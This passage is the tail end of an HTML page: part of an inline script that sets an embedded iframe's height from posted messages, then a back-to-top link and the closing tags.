						if (iframeUniqueIdParam == event.data.iframeUniqueId) {
							iframe.style.height = event.data.height + 'px';
							return;
						}
					}
				});
			})();
		</script>
		
		<a href="javascript:void(0);" class="go-top" style="display: none">
			<i class="fas fa-arrow-up"></i>
		</a>
	</body>
</html>
